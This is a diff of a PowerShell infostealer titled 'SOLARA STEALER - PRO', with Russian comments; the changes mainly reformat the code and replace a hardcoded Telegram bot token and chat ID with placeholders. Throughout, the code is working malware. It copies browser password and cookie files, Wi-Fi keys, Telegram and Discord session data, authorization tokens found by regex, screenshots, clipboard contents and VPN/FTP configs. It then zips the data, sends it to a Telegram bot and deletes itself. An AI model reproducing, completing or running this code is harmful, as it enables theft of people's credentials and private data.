@@ -2,7 +2,7 @@
 # ||                                                                                             ||
 # ||                                  SOLARA STEALER - PRO                                      ||
 # ||                                                                                             ||
-# ||      Расширенная версия скрипта для сбора данных и отправки в Telegram.                   ||
+# ||      Расширенная версия скрипта для сбора данных и отправки в Telegram.                     ||
 # ||                Поддержка расширенного списка браузеров и ПО.                               ||
 # ||                                                                                             ||
 # =================================================================================================
@@ -12,44 +12,44 @@
 # -------------------------------------------------------------------------------------------------
 
 # --- Конфигурация Telegram ---
-$TelegramToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
-$ChatID = "1266539824"
+$TelegramToken = "<ВАШ_ТОКЕН>"
+$ChatID = "<ВАШ_CHAT_ID>"
 
 # --- Настройки сбора данных ---
-$StealBrowserData = $true      # Включает кражу паролей, cookie, истории, автозаполнения
-$StealFiles = $true
-$StealSystemInfo = $true
-$StealGamingSessions = $true
-$StealMessengerLogs = $true
-$StealSessionsAndTokens = $true
-$TakeScreenshot = $true
-$GrabClipboard = $true
-$StealVpnFtp = $true
+$StealBrowserData      = $true
+$StealFiles            = $true
+$StealSystemInfo       = $true
+$StealGamingSessions   = $true
+$StealMessengerLogs    = $true
+$StealSessionsAndTokens= $true
+$TakeScreenshot        = $true
+$GrabClipboard         = $true
+$StealVpnFtp           = $true
 
-# --- Настройки обфускации и очистки ---
+# --- Настройки очистки ---
 $SelfDelete = $true # Удалить скрипт после выполнения
 
-# --- Текстовые сообщения для вывода в консоль (можно легко изменить) ---
+# --- Сообщения для консоли ---
 $OutputMessages = @{
-    Start = "Запуск профессионального модуля сбора данных..."
-    SystemInfo = "[+] Сбор информации о системе и сети..."
-    BrowserSearch = "[+] Поиск установленных браузеров..."
-    BrowserData = "[+] Извлечение файлов сессий, паролей и cookies для оффлайн-анализа..."
-    Files = "[+] Поиск и копирование файлов (doc, txt, xls)..."
-    Gaming = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
-    Messengers = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
-    Tokens = "[+] Поиск токенов авторизации..."
-    Screenshot = "[+] Создание скриншота экрана..."
-    Clipboard = "[+] Копирование данных из буфера обмена..."
-    VpnFtp = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
-    Archiving = "[+] Архивирование данных..."
-    Sending = "[+] Отправка архива в Telegram..."
-    Cleaning = "[+] Очистка следов..."
-    Complete = "Процесс завершен."
+    Start        = "Запуск профессионального модуля сбора данных..."
+    SystemInfo   = "[+] Сбор информации о системе и сети..."
+    BrowserSearch= "[+] Поиск установленных браузеров..."
+    BrowserData  = "[+] Извлечение файлов сессий, паролей и cookies для оффлайн-анализа..."
+    Files        = "[+] Поиск и копирование файлов (doc, txt, xls)..."
+    Gaming       = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
+    Messengers   = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
+    Tokens       = "[+] Поиск токенов авторизации..."
+    Screenshot   = "[+] Создание скриншота экрана..."
+    Clipboard    = "[+] Копирование данных из буфера обмена..."
+    VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
+    Archiving    = "[+] Архивирование данных..."
+    Sending      = "[+] Отправка архива в Telegram..."
+    Cleaning     = "[+] Очистка следов..."
+    Complete     = "Процесс завершен."
 }
 
 # -------------------------------------------------------------------------------------------------
-# |                                    ИСПОЛНЯЕМЫЙ КОД (НЕ ТРОГАТЬ)                            |
+# |                                    ИСПОЛНЯЕМЫЙ КОД                                          |
 # -------------------------------------------------------------------------------------------------
 
 function Start-Stealer {
@@ -101,11 +101,9 @@ function Start-Stealer {
             Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
             Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
         }
-
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
         Compress-Archive -Path "$LogFolder\*" -DestinationPath $ZipPath -Force
-
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
         Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
     }
@@ -127,7 +125,6 @@ function Start-Stealer {
 }
 
 # --- Функции сбора данных ---
-
 function Get-SystemInformation {
     param($LogPath)
     $SysInfoPath = "$LogPath\SystemInfo.txt"
@@ -136,16 +133,16 @@ function Get-SystemInformation {
         $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
         $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip" -TimeoutSec 5
 
-        "Date: $(Get-Date)" | Out-File $SysInfoPath -Append -Encoding utf8
-        "Username: $env:USERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
+        "Date: $(Get-Date)"              | Out-File $SysInfoPath -Append -Encoding utf8
+        "Username: $env:USERNAME"        | Out-File $SysInfoPath -Append -Encoding utf8
         "Computer Name: $env:COMPUTERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
-        "IP Address: $ip" | Out-File $SysInfoPath -Append -Encoding utf8
+        "IP Address: $ip"                | Out-File $SysInfoPath -Append -Encoding utf8
         "Location: $($geo.city), $($geo.country)" | Out-File $SysInfoPath -Append -Encoding utf8
-        "OS: $($info.OsName)" | Out-File $SysInfoPath -Append -Encoding utf8
+        "OS: $($info.OsName)"            | Out-File $SysInfoPath -Append -Encoding utf8
         "CPU: $($info.CsProcessors.Name[0])" | Out-File $SysInfoPath -Append -Encoding utf8
         "RAM: $([math]::Round($info.OsTotalVisibleMemorySize / 1MB)) MB" | Out-File $SysInfoPath -Append -Encoding utf8
-        
-        "--- Network ---" | Out-File $SysInfoPath -Append -Encoding utf8
+
+        "--- Network ---"                | Out-File $SysInfoPath -Append -Encoding utf8
         (netsh wlan show profiles) | ForEach-Object {
             if ($_ -match 'All User Profile\s+:\s(.*)') {
                 $ssid = $matches[1].Trim()
@@ -153,8 +150,8 @@ function Get-SystemInformation {
                 "Wi-Fi: $ssid | Password: $key" | Out-File $SysInfoPath -Append -Encoding utf8
             }
         }
-        
-        "--- Installed Programs ---" | Out-File $SysInfoPath -Append -Encoding utf8
+
+        "--- Installed Programs ---"     | Out-File $SysInfoPath -Append -Encoding utf8
         Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table | Out-File $SysInfoPath -Append -Encoding utf8
     } catch {
         "Failed to get full system info: $($_.Exception.Message)" | Out-File $SysInfoPath -Append -Encoding utf8
@@ -188,32 +185,28 @@ function Get-ClipboardData {
 
 function Find-AllBrowserProfiles {
     $profiles = @{}
-    $basePaths = @(
-        "$env:LOCALAPPDATA",
-        "$env:APPDATA"
-    )
+    $basePaths = @("$env:LOCALAPPDATA", "$env:APPDATA")
     $browserData = @{
-        'Google\Chrome' = 'Chrome';
-        'Google\Chrome Beta' = 'Chrome Beta';
-        'Chromium' = 'Chromium';
-        'Microsoft\Edge' = 'Edge';
+        'Google\Chrome'               = 'Chrome';
+        'Google\Chrome Beta'          = 'Chrome Beta';
+        'Chromium'                    = 'Chromium';
+        'Microsoft\Edge'              = 'Edge';
         'BraveSoftware\Brave-Browser' = 'Brave';
-        'Yandex\YandexBrowser' = 'Yandex';
-        'Vivaldi' = 'Vivaldi';
+        'Yandex\YandexBrowser'        = 'Yandex';
+        'Vivaldi'                     = 'Vivaldi';
         'Opera Software\Opera Stable' = 'Opera';
         'Opera Software\Opera GX Stable' = 'Opera GX';
-        'Comet' = 'Comet';
-        'Orbitum' = 'Orbitum';
-        'Amigo' = 'Amigo';
-        'Torch' = 'Torch';
-        'SunBrowser' = 'SunBrowser';
-        'Thorium' = 'Thorium';
-        'UCBrowser' = 'UC Browser';
-        'Mozilla\Firefox' = 'Firefox';
-        'Waterfox' = 'Waterfox';
-        'Tor Browser' = 'Tor Browser';
+        'Comet'                       = 'Comet';
+        'Orbitum'                     = 'Orbitum';
+        'Amigo'                       = 'Amigo';
+        'Torch'                       = 'Torch';
+        'SunBrowser'                  = 'SunBrowser';
+        'Thorium'                     = 'Thorium';
+        'UCBrowser'                   = 'UC Browser';
+        'Mozilla\Firefox'             = 'Firefox';
+        'Waterfox'                    = 'Waterfox';
+        'Tor Browser'                 = 'Tor Browser';
     }
-
     foreach ($base in $basePaths) {
         foreach ($path in $browserData.Keys) {
             $fullPath = Join-Path -Path $base -ChildPath $path
@@ -232,7 +225,7 @@ function Find-AllBrowserProfiles {
 function Get-BrowserFiles {
     param ($BrowserProfiles, $LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
-    
+
     $filesToGrab = @(
         'Login Data',        # Chromium passwords
         'Cookies',           # Chromium cookies
@@ -247,9 +240,7 @@ function Get-BrowserFiles {
     foreach ($browserName in $BrowserProfiles.Keys) {
         $browserLogPath = Join-Path -Path $LogPath -ChildPath $browserName
         New-Item -Path $browserLogPath -ItemType Directory -Force | Out-Null
-        
         foreach ($profilePath in $BrowserProfiles[$browserName]) {
-            # Chromium-based
             Get-ChildItem -Path $profilePath -Directory -Filter "*User Data*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
                 foreach($file in $filesToGrab) {
                     $filePath = Join-Path $_.FullName $file
@@ -258,7 +249,6 @@ function Get-BrowserFiles {
                     }
                 }
             }
-            # Firefox-based
             Get-ChildItem -Path $profilePath -Directory -Filter "*.default*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
                 foreach($file in $filesToGrab) {
                     $filePath = Join-Path $_.FullName $file
@@ -311,19 +301,13 @@ function Get-GamingData {
 function Get-MessengerData {
     param($LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
-    
-    # Telegram - ИСПРАВЛЕНО: используем -Exclude вместо -Filter
+    # Telegram
     try {
         $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
         if (Test-Path $tgPath) {
-            Copy-Item -Path $tgPath `
-                -Destination (Join-Path $LogPath "Telegram") `
-                -Recurse -Force `
-                -Exclude "user_data*", "cache*" `
-                -ErrorAction SilentlyContinue
+            Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") -Recurse -Force -Exclude "user_data*", "cache*" -ErrorAction SilentlyContinue
         }
     } catch {}
-    
     # Discord
     $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
     foreach ($path in $discordPaths) {
@@ -339,16 +323,14 @@ function Get-Tokens {
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
     $searchPaths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb")
     foreach ($browser in $BrowserProfiles.Keys) {
-        if ($browser -notlike "*Firefox*") { # Regex on ldb files is mainly for Chromium
+        if ($browser -notlike "*Firefox*") {
             foreach ($profilePath in $BrowserProfiles[$browser]) {
                 $searchPaths += Join-Path $profilePath "Local Storage\leveldb"
             }
         }
     }
-
     $regex = '([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})'
     $foundTokens = New-Object System.Collections.Generic.HashSet[string]
-    
     foreach($path in ($searchPaths | Get-Unique)){
         if(Test-Path $path){
             Get-ChildItem $path -Filter "*.ldb" -File -ErrorAction SilentlyContinue | ForEach-Object {
